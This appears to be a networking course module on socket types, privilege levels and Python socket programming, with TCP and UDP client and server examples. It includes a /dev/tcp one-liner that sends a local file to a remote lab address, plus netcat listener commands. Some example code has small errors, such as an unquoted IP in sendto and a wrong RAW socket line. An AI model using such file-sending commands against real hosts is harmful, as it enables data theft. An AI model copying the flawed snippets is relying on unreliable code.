Packet crafting is the practice of manually constructing network packets to manipulate how they interact with systems and applications. This skill is critical for testing network defenses and bypassing security mechanisms. By crafting packets, cybersecurity professionals can simulate complex attacks like DoS, spoofing, and man-in-the-middle attacks, enabling better protection strategies.

In short, socket programming and packet crafting are not just technical skills—they are essential tools for cybersecurity professionals. They provide a deeper understanding of how networks function, enabling you to more effectively defend against and respond to threats. Without this knowledge, you’re operating with an incomplete understanding of network communication, which makes developing robust security practices much harder.



Resources


Instructor Note


5.1 Understanding socket types for network functions¶
Stream socket - Normally used with TCP, SCTP, and Bluetooth. A stream socket provides a connection-oriented and sequenced flow of data which has methods for establishment and teardown of connections as well as error detection.

Datagram socket - Normally used with UDP. A datagram socket is connection-less by nature. Sockets built this way can send and receive data, but there is no mechanism to retransmit data if a packet is dropped.

Raw socket - A raw socket allows for the direct sending and receiving of IP packets without automatic protocol-specific transport layer formatting, meaning that all headers are typically included in the packet and not removed when moving up the network stack.

Raw sockets are used in user applications such as nmap, tcpdump, and wireshark when using elevated privilege levels. Nmap needs to open raw sockets when attempting to set specific flags for performing certain scans. Tcpdump requires raw sockets in order to receive each packet, in its entirety, for total packet analysis.


Resources


Instructor Note


5.2 Differentiate user space/kernel space sockets¶






System memory can be divided into two regions: kernel space and user space. Kernel space is where the operating system runs and provides its services. User space is a portion of system memory where a user's processes can run. For a user space process to access or execute functions that require interaction with the OS software or the host's hardware, a system call to the kernel is made on behalf of the user space process. This segregation of privilege is important to maintaining system stability and security. OSes generally use a number of API's and libraries in order to manage the functions that span user to kernel space.

Sockets can be created by programs that reside in user space, however, in order to function with/through the device hardware, a corresponding kernel socket must be created and linked. If a program is seeking access to or through a device (hardware) such as a NIC, privileges are needed in order to access or link to kernel space sockets.

Stream and Datagram sockets are considered user space sockets and are typically the most common. These sockets do not need elevated privileges to perform the actions the user level applications are attempting.

Raw sockets are considered kernel space sockets since they are attempting to access hardware interfaces directly to prevent encapsulation/decapsulation or to create packets from scratch.



Resources


Instructor Note


5.2.1 User space Applications and Sockets¶
Using tcpdump or wireshark to read a file

/usr/sbin/tcpdump -r <file.pcap>
Using nmap with no switches

nmap 172.16.82.96/27
Using netcat to connect to a listener

nc 172.16.82.106 22
Using netcat to create a listener above the well known port range (1024+)

nc -lvp 1024
Using /dev/tcp or /dev/udp to transmit data

cat file.txt > /dev/tcp/172.16.82.106/1024


Resources


Instructor Note


5.2.2 Kernel space Applications and Sockets¶
Using tcpdump or wireshark to capture packets on the wire

sudo tcpdump -i eth0 'tcp port 22' -r capture.pcap
Using nmap for OS identification or to set specific flags when scanning

sudo nmap -sX 172.16.82.96/27
Using netcat to create a listener in the well known port range (0 - 1023)

sudo nc -lvp 1023
Using Scapy to craft or modify a packet for transmission

sudo scapy


Resources


Instructor Note


5.3 Understanding socket creation behavior based on privilege level¶
Where does the OS or tools being used come in?

Software, applications, etc, that require access to or utilization of communications rely on the kernel's networking functions. Both the POSIX specification (for nix-systems) and Winsock (for Microsoft windows) use handles known as sockets for identifying an endpoint that is communicating. This may be a process (such as with inter-process communications) or it may be a NIC and service on an operating system looking to communication over a network. Berkeley sockets (known as BSD for Berkeley Software Distribution) provide an API for both domain sockets used during IPC's and Internet sockets used for communications over the network. Sockets that traverse a NIC are classified as either datagram (UDP) or stream (SCTP/TCP) sockets within the INET (Internet socket) family.
What about things that don't ride over transport layers?

While normal network communications operate over TCP or UDP, with INET socket functions specific to those protocols, not all communications over a network operate over the transport layer. Many network specific protocols such as OSPF, IGMP, ICMP etc, use raw sockets to send and receive information. BSD supports the use of raw sockets.
How can raw sockets be used?

The INET family sockets for TCP or UDP expect payload information without lower layer headers (MAC, IP), having been de-encapsulated. A raw socket on the other hand will see/handle all of this information. Following Windows XP, Winsock limited raw socket support due to security concerns, however most nix-like systems fully support raw sockets. Raw sockets not only see this information, but they can be used to allow applications to write information into structures for transmission. TCPDump uses a raw socket to capture information, while NMAP uses them to transmit crafted packets for scanning and OS detection among other things.


Resources


Instructor Note
5.4 Implement Network Programming with Python3¶


Resources


Instructor Note
5.4.1 Understanding Python Libraries¶
Libraries - The Python standard library is only one of many libraries created for Python programming. There are "third-party" created libraries available for public use. Each of these libraries contains its own modules and functions. To get an idea of some other libraries you can reference this link of 20 Python libraries you can’t live without.

Additional 3rd party libraries can be found at pypi.org.

Python comes pre-loaded with its own standard library that can be referenced here (Python 3 Library ).

The Python library can contain:

Module - A module is a file consisting of Python code. A module can define functions, classes and variables. Some popular modules are:

struct
socket
sys
Function - A function is a block of organized, reusable code that is used to perform a single, related action. Functions provide better modularity for your application and a high degree of code reusing. A function is a block of code within a module which only runs when it is called. You can pass data, known as parameters, into a function. A function can return data as a result. Some popular functions include:

struct.pack
socket.socket
or other "user-defined"
Built-In Examples:
int()
len()
str()
sum()
print()
Methods - a piece of code or function that “belongs to” an object. Generally its a very basic function that performs a task within the function but does not usually return data.

What is a Method:
The method is implicitly used for an object for which it is called.
The method is accessible to data that is contained within the function/class.
Can create methods within the function or can call a 'built-in' method
does not normally return data
cannot be called to perform a task without calling the Class/Object it's associated with.
can be simple such as changing the case or printing test.
You can have methods to perform mathematical tasks like add, sub, multiply, or divide.
Built-In String Methods:
my_string.upper()
my_string.lower()
my_list.strip()
my_string.split()
my_list.replace()
my_list.count()
my_list.clear()
my_list.append()
my_list.insert()
Exceptions - An exception is a special condition encountered during program execution that is unexpected or anomalous. This will typically break your code with some sort of error. Typically you hear exception handling to manage issues such as:

Attempting to execute without proper permissions
Using Ctrl + C to perform a non-graceful exit of the program
Attempting to access a file that does not exist
Constants - A constant is a term used to describe data or a value that does not change in a specified amount of time, unlike a variable. Some examples include:

AF_INET - always represents ipv4 address family
AF_INET6 - always represents ipv6 address family
SOCK_STREAM - always represents a stream socket
SOCK_DGRAM - always represents a datagram socket
SOCK_RAW - always represents a raw socket
Objects - a section of code used in object-oriented programming that can be used by other object modules or the program being created. Some objects in the socket function are:

socket.bind(address)
socket.connect(address)
socket.send(bytes[,flags])
socket.close()
Python Collections (Arrays) - There are four collection data types in the Python programming language:

List: A data structure in Python that is a mutable, or changeable, ordered sequence of elements. Each element or value that is inside of a list is called an item. Just as strings are defined as characters between quotes, lists are defined by having values between square brackets [ ] .


thislist = ["apple", "banana", "cherry"]
    print(thislist)
    print(thislist[1])
    print(thislist[-1])
Tuple: Immutable sequence of Python objects. Tuples are sequences, just like lists. The differences between tuples and lists are, the tuples cannot be changed unlike lists and tuples use parentheses, whereas lists use square brackets. Creating a tuple is as simple as putting different comma-separated values and having the values between ( ).


thistuple = ("apple", "banana", "cherry")
    print(thistuple)
Set: A collection which is unordered and unindexed. No duplicate members.


thisset = {"apple", "banana", "cherry"}
    print(thisset)
Dictionary: A collection which is unordered, changeable, and indexed. No duplicate members.


thisdict = {
"brand": "Ford",
"model": "Mustang",
"year": 1964
}
print(thisdict)
Data Types: - Describes what the format required by the data such as "string" or "integer" or "float" etc.

Numeric Type:

integer (int) - decimal or binary numbers.
floating-point number (float) - decimal integer. It can have anywhere from 1+ decimal digits.
complex numbers (complex) - integer w/ variable.
Text Type:

strings - Textual data in Python is handled with str objects, or strings. Strings are immutable sequences of Unicode code points. String literals are written in a variety of ways:

Single quotes: 'allows embedded "double" quotes'.

Double quotes: "allows embedded 'single' quotes".

Triple quoted: '''Three single quotes''', """Three double quotes""".
string methods:


str.capitalize()
str.casefold()
str.center(width[, fillchar])
str.count(sub[, start[, end]])
Sequence Type:

list - Lists are mutable sequences, typically used to store collections of homogeneous items (where the precise degree of similarity will vary by application).


List1 = [10, 20, 30]
print(List)
List2 = ["CCTC", "Students", "AIT", "BOLC"]
print(List2[0])     # CCTC
print(List2[1])     # Students
print(List2[2])     # AIT
print(List2[3])     # BOLC
tuple - Tuples are immutable (cannot change) sequences, typically used to store collections of heterogeneous data (such as the 2-tuples produced by the enumerate() built-in). Tuples are also used for cases where an immutable sequence of homogeneous data is needed (such as allowing storage in a set or dict instance).


thistuple = ("10.10.0.40", 4444)
print(thistuple)
range - represents an immutable sequence of numbers and is commonly used for looping a specific number of times in for loops.

Mapping Type:

dict - A mapping object maps hashable values to arbitrary objects. Mappings are mutable objects. There is currently only one standard mapping type, the dictionary. (For other containers see the built-in list, set, and tuple classes, and the collections module.) A dictionary’s keys are almost arbitrary values. Values that are not hashable, that is, values containing lists, dictionaries or other mutable types (that are compared by value rather than by object identity) may not be used as keys. Numeric types used for keys obey the normal rules for numeric comparison: if two numbers compare equal (such as 1 and 1.0) then they can be used interchangeably to index the same dictionary entry. (Note however, that since computers store floating-point numbers as approximations it is usually unwise to use them as dictionary keys.)
Set Type:

set - Return a new set or frozenset object whose elements are taken from iterable. The elements of a set must be hashable.
frozenset - To represent sets of sets, the inner sets must be frozenset objects. If iterable is not specified, a new empty set is returned.
Boolean Type:

bool - Boolean values are the two constant objects False and True. They are used to represent truth values (although other values can also be considered false or true). In numeric contexts (for example when used as the argument to an arithmetic operator), they behave like the integers 0 and 1, respectively. The built-in function bool() can be used to convert any value to a Boolean, if the value can be interpreted as a truth value (see section Truth Value Testing above). They are written as False and True, respectively.
Binary Type:

bytes - Bytes objects are immutable sequences of single bytes. Since many major binary protocols are based on the ASCII text encoding, bytes objects offer several methods that are only valid when working with ASCII compatible data and are closely related to string objects in a variety of other ways.
bytearray - Objects are a mutable counterpart to bytes objects. There is no dedicated literal syntax for bytearray objects, instead they are always created by calling the constructor.
memoryview - object exposes the C level buffer interface as a Python object which can then be passed around like any other object.
Built-Ins - functions, and types built into python that is always available and does not need to be imported.



Resources


Instructor Note


5.4.2 How Imports Work¶
The import statements do a lot under the hood to import a file or module. First, they look for your module or package in sys.modules, where Python stores your previously imported code. If Python cannot find the module there, it will then search through the Python Standard Library for it. If Python still cannot find the module, it will go through your entire storage space, starting with the current directory and the ones listed in your system.path. If the module is found in these places, it will add the module to your program, otherwise, it will give a ModuleNotFoundError.

import {module} - this will import the entire module or package. To call it you must use the proper syntax of module.function each time. (i.e. socket.AF_INET)

from {module} as {name} - same as above but can be used to call the module under a different user defined name. This can be useful if your module/function conflicts with user defined variables. Also to call using a more "friendly" naming.

from {module} import {function} - this will import only that function from the specified module. It can now be called by specifying the function name only and not needing to use the module.function .

from {module} import * - same as above but imports all functions under that module. This allows you to call all functions with out needing to use the module.function convention. Care should be used as the function names could interfere with variable names.

from {module} import {function} as {name} - this will import only that function from the specified module under a different user defined name.



Resources


Instructor Note


5.4.3 Using python3 to create sockets¶
In order to program sockets with python3, you need to understand some of the libraries and functions that go along with it. The first library we will discuss is the socket module.

Inside the socket module we will first look at the functions that are tied to the socket function - "socket.socket". Here is an example:

import socket
s = socket.socket(socket.FAMILY, socket.TYPE, socket.PROTOCOL)
Here we import the socket module which provides access to the functions in the socket module.
Then we create a variable s to link to the socket function in the socket library.
Inside the socket.socket function, you have these arguments in order: socket.socket([family[,type[,proto]]]).

Possible values for the socket objects:

family constants should be: AF_INET (default), AF_INET6, AF_UNIX
type constants should be: SOCK_STREAM (default), SOCK_DGRAM, SOCK_RAW
proto constants should be: 0 (default), IPPROTO_TCP, IPPROTO_UDP, IPPROTO_ICMP, IPPROTO_RAW


Resources


Instructor Note


5.4.4 Understanding Socket API Functions¶
Before we start to create our own sockets lets take a moment to understand the componnents and the order that a socket is established.

Components. Many are required for every TCP/UDP connection. Some are optional.

socket() creates a new socket of a certain type, identified by an integer number, and allocates system resources to it.
bind() is typically used on the server-side, and associates a socket with a socket address structure, i.e. a specified local IP address and a port number.
listen() is used on the server-side, and causes a bound TCP socket to enter listening state.
connect() is used on the client-side, and assigns a free local port number to a socket. In the case of a TCP socket, it causes an attempt to establish a new TCP connection.
accept() is used on the server-side. It accepts a received incoming attempt to create a new TCP connection from the remote client, and creates a new socket associated with the socket address pair of this connection.
send(), sendall(), recv(), sendto(), and recvfrom() are used for sending and receiving data. The standard functions write() and read() may also be used.
close() causes the system to release resources allocated to a socket. In case of TCP, the connection is terminated.
gethostbyname() and gethostbyaddr() are used to resolve hostnames and addresses. IPv4 only.
select() is used to suspend, waiting for one or more of a provided list of sockets to be ready to read, ready to write, or that have errors.
poll() is used to check on the state of a socket in a set of sockets. The set can be tested to see if any socket can be written to, read from or if an error occurred.
getsockopt() is used to retrieve the current value of a particular socket option for the specified socket.
setsockopt() is used to set a particular socket option for the specified socket.


Typical TCP connection:




Client Socket		Server Socket
socket(family, type, proto)		socket(family, type,proto`)
setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
bind(('', port))
listen(1) - Enable a server to accept TCP connections
connect((ip, port)) - TCP only	->	accept() - TCP only
sendto() - send to unestablished socket send() - send to established socket sendall()-repeats 'send' until all data sent	->	recv() - recv data from socket recvfrom() - recv data and socket info
recv() - recv data from socket recvfrom() - recv data and socket info	->	sendto() - send to unestablished socket send() - send to established socket sendall()-repeats 'send' until all data sent
close() - Close a socket file descriptor	↔	close() - Close a socket file descriptor


Resources


Instructor Note


5.4.4.1 Socket (socket.socket())¶
The function socket() creates an endpoint for communication and returns a file descriptor for the socket. It uses three arguments:

Family: These define the domain of the socket. It specifies the protocol family of the created socket. For example:

socket.AF_INET for network protocol IPv4 (IPv4-only)
socket.AF_INET6 for IPv6 (and in some cases, backward compatible with IPv4)
socket.AF_UNIX (also known as AF_LOCAL) for local socket (using a file). These sockets allow interprocess communication (IPC) on the same system without using network protocols like TCP/IP.
socket.AF_BLUETOOTH for Bluetooth communication
socket.AF_CAN for Controller Area Network (automotive, industrial use).
socket.AF_PACKET for Low-level packet interface (raw sockets, Linux only).
Type: These define how data is sent and received. Specifies the transport protocol to used. These protocols are specified in file netinet/in.h. The value 0 may be used to select a default protocol from the selected domain and type.

socket.SOCK_STREAM for reliable stream-oriented service or Stream Sockets
socket.SOCK_DGRAM for datagram service or Datagram Sockets
socket.SOCK_SEQPACKET for reliable sequenced packet service
socket.SOCK_RDM Reliable datagram (rarely used)
socket.SOCK_RAW (raw protocols atop the network layer). You may specify a valid IANA IP protocol defined in RFC 1700 assigned numbers.
Protocol (man ip(7)):

socket.IPPROTO_TCP (or 0 if you used SOCK_STREAM) for TCP STREAM communication. (man tcp(7))

socket.IPPROTO_UDP (or 0 if you used SOCK_DGRAM) for UDP Datagram communication. (man udp(7)).

socket.IPPROTO_ICMP allows you to create ICMP (ping, traceroute).

socket.IPPROTO_IP creates a socket that sends/receives raw data for IPv4-based protocols (TCP, UDP, etc). It will handle the IP headers for you, but you are responsible for processing/creating additional protocol data inside the IP payload.

socket.IPPROTO_RAW creates a socket that sends/receives raw data for any kind of protocol. It will not handle any headers for you, you are responsible for processing/creating all payload data, including IP and additional headers. (man raw(7))

The function returns -1 if an error occurred. Otherwise, it returns an integer representing the newly assigned descriptor.

STREAM: s = socket.socket() or s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0 )
DGRAM: s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0 )
RAW: s = socket.socket() or s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW )


Resources


Instructor Note


5.4.4.2 setsockopt (socket.setsockopt())¶
setsockopt(level, optname, value) allows you to configure various socket options, such as setting the socket to non-blocking mode, enabling or disabling certain behaviors (e.g., timeouts, buffering), or customizing protocol-specific options. It gives you control over the socket's behavior and allows you to tune it for specific use cases.

level: The level at which the option resides (e.g., socket.SOL_SOCKET, socket.IPPROTO_TCP, etc.). This determines the layer of the socket stack (e.g., the socket layer, the transport layer, etc.).

SO_REUSEADDR (Level: SOL_SOCKET): This option allows a socket to bind to an address and port even if they are in use by another socket. This is useful for servers that want to restart without waiting for the OS to release the address.
SO_RCVBUF (Level: SOL_SOCKET): This option controls the size of the receive buffer for the socket. You can increase the size if you expect large volumes of incoming data.
TCP_NODELAY (Level: IPPROTO_TCP): This option disables the Nagle algorithm, which combines small outgoing messages into one to reduce network congestion. This can be useful for applications requiring low-latency communication, such as gaming or real-time communication.
optname: The option you want to set. This can vary depending on the level. For example, socket.SO_REUSEADDR, socket.SO_RCVBUF, socket.TCP_NODELAY, etc.

value: The value to set for the option. The type and meaning of this value depend on the optname.

Re-use address: s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

Change server buffer size: s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 65536)
Change delay: s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)


Resources


Instructor Note


5.4.4.3 bind (socket.bind())¶
bind() associates a socket with an address. When a socket is created with socket(), it is only given a protocol family, but not assigned an address. This association must be performed before the socket can accept connections from other hosts.

The function accepts the tuple of the IP (typically 127.0.0.1) and the listening port and arguments.
Bind() returns 0 on success and -1 if an error occurs.

s.bind(('127.0.0.1', 12345))



Resources


Instructor Note


5.4.4.4 listen (socket.listen())¶
After a socket has been associated with an address, listen() prepares it for incoming connections. However, this is only necessary for the stream-oriented (connection-oriented) data modes, i.e., for socket types (SOCK_STREAM, SOCK_SEQPACKET).

Once a connection is accepted, it is dequeued. On success, 0 is returned. If an error occurs, -1 is returned.

s.listen()



Resources


Instructor Note


5.4.4.5 accept (socket.accept())¶
When an application is listening for stream-oriented connections from other hosts, it is notified of such events (cf. select() function) and must initialize the connection using function accept().

It creates a new socket for each connection and removes the connection from the listening queue.

The return value is a pair (conn, address) where conn is a new socket object usable to send and receive data on the connection, and address is the address bound to the socket on the other end of the connection.

accept() returns the new socket descriptor for the accepted connection, or the value -1 if an error occurs. All further communication with the remote host now occurs via this new socket.

Datagram sockets do not require processing by accept() since the receiver may immediately respond to the request using the listening socket.

s.accept()



Resources


Instructor Note


5.4.4.6 connect (socket.connect())¶
connect() establishes a direct communication link to a specific remote host identified by its address via a socket, identified by its file descriptor.

When using a connection-oriented protocol, this establishes a connection by using the TCP 3-way handshake process.

Certain types of protocols are connectionless, most notably the User Datagram Protocol. When used with connectionless protocols, connect defines the remote address for sending and receiving data, allowing the use of functions such as send and recv. In these cases, the connect function prevents the reception of datagrams from other sources.

connect() returns an integer representing the error code: 0 represents success, while –1 represents an error. Historically, in BSD-derived systems, the state of a socket descriptor is undefined if the call to connect fails (as it is specified in the Single Unix Specification), thus, portable applications should close the socket descriptor immediately and obtain a new descriptor with socket(), in the case the call to connect() fails.

s.connect()



Resources


Instructor Note


5.4.4.7 send (socket.send())¶
socket.send(data) is used to send data over a TCP socket. This method allows you to send bytes data from your program to a connected socket (usually a remote server or client).

data: This parameter is the data you want to send, and it must be in the form of a bytes object (not a string). If you have a string, you will need to encode it into bytes first (e.g., using b"String" or .encode()).
s.send(b"Hello World")



Resources


Instructor Note


5.4.4.8 sendall (socket.sendall())¶
socket.sendall(data) is used to send data over a TCP socket (connection-oriented communication). It ensures that all the data you intend to send is transmitted. Unlike socket.send(), which may send only part of the data, sendall() keeps sending the data until the entire message is sent or an error occurs.

data: This parameter is the data you want to send, and it must be in the form of a bytes object (not a string). If you have a string, you will need to encode it into bytes first (e.g., using b"String" or .encode()).
s.sendall(b"Hello World")



Resources


Instructor Note


5.4.4.9 sendto (socket.sendto())¶
socket.sendto(data, address) is to send data over a UDP socket (or other datagram-based communication).

data: This parameter is the data you want to send, and it must be in the form of a bytes object (not a string). If you have a string, you will need to encode it into bytes first (e.g., using b"String" or .encode()).
address: A tuple containing the destination address and port in the form (host, port). This specifies the recipient of the data.
s.sendto(b"Hello World", (172.16.1.15, 1111))



Resources


Instructor Note


5.4.4.10 recv (socket.recv())¶
socket.recv(buffersize) allows a program to receive data from a remote socket (i.e., from a connected server or client).

buffersize: This is an integer that specifies the maximum amount of data to be received at once (in bytes). It determines the maximum size of the buffer for the incoming data. If the amount of data being sent is larger than the buffer size, multiple recv() calls may be needed to read the entire message.
The method returns ONLY a bytes object containing the data read from the socket.

data = s.recv(1024)



Resources


Instructor Note


5.4.4.11 recvfrom (socket.recvfrom())¶
socket.recvfrom(buffersize) allows a program to receive data and the address from a remote socket (i.e., from a connected server or client).

buffersize: This is an integer that specifies the maximum amount of data to be received at once (in bytes). It determines the maximum size of the buffer for the incoming data. If the amount of data being sent is larger than the buffer size, multiple recv() calls may be needed to read the entire message.
The return value is a pair (bytes, address) where bytes is a bytes object representing the data received and address is the address of the socket sending the data.

data, addr = s.recvfrom(1024)



Resources


Instructor Note


5.4.4.12 close (socket.close())¶
socket.close() is a method used in network programming to close a socket and free up the resources associated with it.

Always use to:

Avoid resource leaks.
Release the file descriptor.
Free up system resources (like port bindings).
Avoid hitting the max limit of open sockets, especially in long-running apps.
s.close()



Resources


Instructor Note


5.5 Demonstration of creating STREAM and DGRAM Sockets¶


Resources


Instructor Note


5.5.1 TCP Stream Client¶
Here is an example of creating an IPv4 Stream socket. Note that proto field is unnecessary since it keeps the default value of zero.

stream.py

import socket

# This can also be accomplished by using s = socket.socket() due to AF_INET and SOCK_STREAM being defaults
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

ipaddr = '127.0.0.1'
port = 1111

s.connect((ipaddr, port))

# To send a string as a bytes-like object, add the prefix b to the string. \n is used to go to the next line (hit enter)
s.send(b'Message\n')

# It is recommended that the buffersize used with recvfrom is a power of 2 and not a very large number of bits
data, conn = s.recvfrom(1024)

# In order to receive a message that is sent as a bytes-like-object you must decode into utf-8 (default)
print(data.decode('utf-8'))

s.close()
In the above, we are creating a socket with address family = AF_INET (IPv4) and type = SOCK_STREAM (TCP).
We then define an ip address and port pair.
Next we call the socket object connect(address) tied to IPv4 and TCP we mapped to the variable s which will connect to the remote address and port we provide over IPv4 and TCP.
Continuing on, we will add to this connection by attempting to send a message through the connection and wait for a response.
When we call the socket object send(data) which is also tied to s, it sends whatever we put in for data across the connection. By typing b'Message\n', the string 'Message\n' is converted to a bytes-like object (b) which is required before sending.
After sending the message, we will attempt to receive data from the socket by using the socket object recvfrom(buffersize) tied to the variable s. The socket object recvfrom receives data in a pair (bytes, address) where bytes is the data received as a bytes-like object and address is the socket address. We split recvfrom into the two variables response and conn so we can print only the data portion.
Next we want to print the data received, but we need to decode response into utf-8 (default) from the bytes-like object or it will maintain the prefix b from the message sent across.
Lastly, we will close the socket tied to the variable s to clean up when we are finished.
To test, simply echo a message into a netcat listener session on the same machine you run this script on.


echo "I got your message" | nc -l -p 54321
Then run the script on another terminal.


python3 fg_stream_socket_example_p3.py
The result will be the message "Hello" is sent to the listener and the message "I got your message" is sent to the terminal that ran the script.



Resources


Instructor Note


5.5.2 TCP Stream Server (OPTIONAL)¶
stream_server.py

#!/usr/bin/python3
import socket
import os
port = 1111
message = b"Connected to TCP Server on port %i\n" % port

# Create TCP stream socket using IPv4

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)

# This prevents the bind from being stuck in TIME_WAIT state. The SO_REUSEADDR flag tells the kernel to reuse a local socket in TIME_WAIT state, without waiting for its natural timeout to expire. Will not work if the socket is to the same destination.

s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

# Bind the socket to address.  The socket must not already be bound.
# '' Ties the socket to any IPv4 address on this device

s.bind(('', port))

# Enable a server to accept connections. Listens for 1 request to connect

s.listen(1)

# Execute the command (a string) in a subshell.

os.system("clear")

print ("Waiting for TCP connections\n")

#Listens for connections until stopped
while 1:
    conn, addr = s.accept()
    # This accepts connections from clients and creates a new socket.
    # The return value is a pair (conn, address)
    # conn = a new socket object usable to send and receive data on the connection (local)
    # address = the address bound to the socket on the other end of the connection (remote)

    connect = conn.recv(1024)
    # Waits for a message to be sent across and breaks out the address
    # Receive data from the socket.
    # The return value is a bytes object representing the data received.
    # The maximum amount of data to be received at once is specified by buffsize

    # connect = data recieved from remote to your local socket.

    address, port = addr
    # splits addr into 2 variables that is contained within it. Remote IP and remote port.
    # Prints the message

    print ("Message Received - '%s'" % connect.decode())  # Attempts to decode the message sent into utf-8 by default

    print ("Sent by -", address, "port -", port, "\n")   # Extracts the address and port that sent the message

    # Sends our message in response. Used when there is a remote connection (TCP)
    conn.sendall(message)

    # Closes the local connection from remote
    conn.close()

#!/usr/bin/python3
import socket
import os
port = 1111
message = b"Connected to TCP Server on port %i\n" % port
% is to assign a interpolation placeholder for information to be supplied Python 3 string formatting.

Paired with the string converstion type. Some examples include:

i = Signed integer decimal
c = Single character
s = String
Further information on interpolation can be found here.

PEP 461 - Adding % formatting to bytes and bytearray




# Create TCP stream socket using IPv4
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)

# This prevents the bind from being stuck in TIME_WAIT state. The SO_REUSEADDR flag tells the kernel to reuse a local socket in TIME_WAIT state, without waiting for its natural timeout to expire. Will not work if the socket is to the same destination.

s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
socket.SOL_SOCKET

Reference from the setsockopt python page.
From setcoskopt(2) man page:
When manipulating socket options, the level at which the option resides and the name of the option must be specified. To manipulate options at the sockets API level, level is specified as SOL_SOCKET. To manipulate options at any other level the protocol number of the appropriate protocol controlling the option is supplied. For example, to indicate that an option is to be interpreted by the TCP protocol, level should be set to the protocol number of TCP.
socket.SO_REUSEADDR

Running an example several times with too small delay between executions, could lead to this error:


OSError: [Errno 98] Address already in use
This is because the previous execution has left the socket in a TIME_WAIT state, and can’t be immediately reused.

There is a socket flag to set, in order to prevent this, socket.SO_REUSEADDR:
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((HOST, PORT))
The SO_REUSEADDR flag tells the kernel to reuse a local socket in TIME_WAIT state, without waiting for its natural timeout to expire.



# Bind the socket to address.  The socket must not already be bound.
# '' Ties the socket to any IPv4 address on this device

s.bind(('', PORT))
Reference from the bind python page.

socket.bind using the tuple of the arguments self, address.

The specification of self is made by the ''.
address is the port number or variable to listen on.



# Bind the socket to address.  The socket must not already be bound.
# '' Ties the socket to any IPv4 address on this device

s.bind(('', PORT))
Reference on socket.listen python page.
Enable a server to accept connections. If backlog is specified, it must be at least 0 (if it is lower, it is set to 0); it specifies the number of unaccepted connections that the system will allow before refusing new connections. If not specified, a default reasonable value is chosen.
s.listen(1) will listen for only 1 connection at a time.



# Execute the command (a string) in a subshell.
os.system("clear")
Reference from the os.system python page.
Execute the command (a string) in a subshell. This is implemented by calling the Standard C function system(), and has the same limitations. Changes to sys.stdin, etc. are not reflected in the environment of the executed command. If command generates any output, it will be sent to the interpreter standard output stream.
os.system("clear") will run the linux command clear to clear the screen.



print ("Waiting for TCP connections\n")

#Listens for connections until stopped
while 1:
    conn, addr = s.accept()
    # This accepts connections from clients and creates a new socket.
    # The return value is a pair (conn, address)
    # conn = a new socket object usable to send and receive data on the connection (local)
    # address = the address bound to the socket on the other end of the connection (remote)

    connect = conn.recv(1024)
    # Waits for a message to be sent across and breaks out the address
    # Receive data from the socket.
    # The return value is a bytes object representing the data received.
    # The maximum amount of data to be received at once is specified by buffsize

    # connect = data recieved from remote to your local socket.

    address, port = addr
    # splits addr into 2 variables that is contained within it. Remote IP and remote port.
    # Prints the message

    print ("Message Received - '%s'" % connect.decode())  # Attempts to decode the message sent into utf-8 by default

    print ("Sent by -", address, "port -", port, "\n")   # Extracts the address and port that sent the message

    # Sends our message in response. Used when there is a remote connection (TCP)
    conn.sendall(message)

    # Closes the local connection from remote
    conn.close()
while 1: Creates a continuous loop to always listen for incomming connections.

Reference from the socket.accept python page.

Accept a connection. The socket must be bound to an address and listening for connections. The return value is a pair (conn, address) where conn is a new socket object usable to send and receive data on the connection, and address is the address bound to the socket on the other end of the connection.
conn is assigned the tuple socket (ip/port) of the local connection.
addr is assigned the tuple socket (ip/port) of the remote connection.
address, port = addr pulls the ip(address) and the port(port) variables from the addr tuple.
Reference from the socket.recv python page.
Receive data from the socket. The return value is a bytes object representing the data received. The maximum amount of data to be received at once is specified by bufsize. See the Unix manual page recv(2) for the meaning of the optional argument flags; it defaults to zero.
conn.recv(1024) where conn is the variable to specifiy the local socket and 1024 is the amount of memory (in bytes) assigned to receive the data.
Reference from the socket.sendall python page.

Send data to the socket. The socket must be connected to a remote socket. The optional flags argument has the same meaning as for recv() above. Unlike send(), this method continues to send data from bytes until either all data has been sent or an error occurs. None is returned on success. On error, an exception is raised, and there is no way to determine how much data, if any, was successfully sent.
conn.sendall(message) where conn is the variable to specifiy the local socket and sendall will continuously send the message until complete.
Reference from the socket.close python page.

Close a socket file descriptor. This is like os.close(), but for sockets. On some platforms (most noticeable Windows) os.close() does not work for socket file descriptors.
conn.close() where conn is the variable to specifiy the local socket to close.


Resources


Instructor Note


5.5.3 UDP Dgram Client¶
Now that we have built a stream socket, we will build a datagram socket to closely mirror the stream socket. Here is an example:

dgram.py

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

ipaddr = '127.0.0.1'
port = 2222

# To send a string as a bytes-like object, add the prefix b to the string. \n is used to go to the next line (hit enter)
s.sendto(b'Message\n', (ipaddr,port))

# It is recommended that the buffersize used with recvfrom is a power of 2 and not a very large number of bits
response, conn = s.recvfrom(1024)

# In order to receive a message that is sent as a bytes-like-object you must decode into utf-8 (default)
print(response.decode())

# Closes the local connection from remote
s.close()
Notice one of the changes here is that we had to use socket.SOCK_DGRAM instead to indicate that the protocol is UDP instead of TCP.

Additionally we removed the connect() and used sendto() rather than send() since we do not connect with UDP. With sendto we need to provide the socket tuple (address, port) with it.

To test, simply echo a message into a netcat listener session on the same machine you run this script on but with the -u option to indicate UDP.


echo "I got your message" | nc -l -p 2222 -u
Then run the script on another terminal.


python3 fg_dgram_socket_example_p3.py
The result will be the message "Hello" is sent to the listener and the message "I got your message" is sent to the terminal that ran the script.



Resources


Instructor Note


5.5.4 UDP Dgram Server (OPTIONAL)¶
dgram_server.py

#!/usr/bin/python3

import socket
import os

PORT = 2222

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

s.bind(('', PORT))
